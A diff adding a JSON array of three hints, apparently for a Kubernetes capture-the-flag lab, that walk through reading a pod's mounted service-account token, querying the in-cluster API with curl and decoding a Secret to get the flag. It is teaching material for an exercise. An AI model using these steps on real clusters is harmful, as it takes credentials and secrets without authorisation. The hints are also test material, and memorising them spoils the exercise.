@@ -1,0 +1,5 @@
+[
+  "Shell into the pod — `kubectl -n dojo-ctf exec -it worker -- sh` — and look under `/var/run/secrets/kubernetes.io/serviceaccount/`. Three files there (`token`, `ca.crt`, `namespace`) are everything you need to be an API client; you don't need any admin kubeconfig.",
+  "The in-cluster API server is always reachable at `https://kubernetes.default.svc`. Present the token as a header and trust the mounted CA: `curl --cacert $SA/ca.crt -H \"Authorization: Bearer $(cat $SA/token)\" https://kubernetes.default.svc/api/v1/namespaces/dojo-ctf/secrets` where `SA=/var/run/secrets/kubernetes.io/serviceaccount`.",
+  "Fetch the one Secret: append `/db-credentials` to that URL. The flag is in `.data.FLAG`, base64-encoded (not encrypted). Pull it without jq: `... | tr ',' '\\n' | grep '\"FLAG\"' | cut -d'\"' -f4 | base64 -d`."
+]
